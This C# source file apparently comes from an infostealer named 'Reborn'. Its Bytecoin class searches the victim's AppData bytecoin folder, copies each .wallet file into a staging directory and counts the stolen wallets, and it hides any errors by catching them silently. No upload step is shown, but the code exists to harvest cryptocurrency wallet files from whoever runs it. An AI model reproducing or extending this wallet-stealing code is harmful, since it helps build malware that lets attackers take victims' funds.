﻿using System.IO;

namespace Reborn
{
    class Bytecoin
    {
        public static int count = 0;
        public static void BCNcoinStr(string directorypath) 
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\bytecoin").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
                    if (file.Extension.Equals(".wallet"))
                    {
                        file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                    }
                }
                count++;
                Counting.Wallets++;
            }
            catch 
            {
                return;
            }
        }
    }
}
